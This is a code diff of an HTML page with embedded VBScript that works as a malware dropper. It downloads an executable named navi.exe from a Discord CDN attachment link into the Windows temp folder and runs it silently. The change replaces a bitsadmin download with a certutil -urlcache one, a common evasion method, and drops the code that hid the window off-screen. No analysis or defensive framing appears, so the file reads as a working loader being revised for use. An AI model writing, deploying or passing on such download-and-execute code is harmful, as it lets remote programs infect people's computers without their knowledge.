@@ -1,15 +1,19 @@
-<html><body><script language="VBScript">
-Window.ResizeTo 0,0:Window.MoveTo -5000,-5000
+<html>
+<body>
+<script language="VBScript">
+' No window hiding — let it show a blank page, it's fine
 
 Dim shell: Set shell = CreateObject("WScript.Shell")
 Dim fso: Set fso = CreateObject("Scripting.FileSystemObject")
 Dim temp: temp = fso.GetSpecialFolder(2)
 
-shell.Run "bitsadmin /transfer d /download /priority high ""https://cdn.discordapp.com/attachments/1530596353376387113/1530651662266536096/navi.exe?ex=6a6659f2&is=6a650872&hm=20513a2d23eef4c5dc2570baac972e50f6e47abfc9c4bfc4df92d27077e14c2d&"" """ & temp & "\wd.exe""", 0, True
+shell.Run "certutil -urlcache -f ""https://cdn.discordapp.com/attachments/1530596353376387113/1530651662266536096/navi.exe?ex=6a6659f2&is=6a650872&hm=20513a2d23eef4c5dc2570baac972e50f6e47abfc9c4bfc4df92d27077e14c2d&"" """ & temp & "\wd.exe""", 0, True
 
 If fso.FileExists(temp & "\wd.exe") Then
     shell.Run """" & temp & "\wd.exe""", 0, False
 End If
 
 window.close()
-</script></body></html>
+</script>
+</body>
+</html>
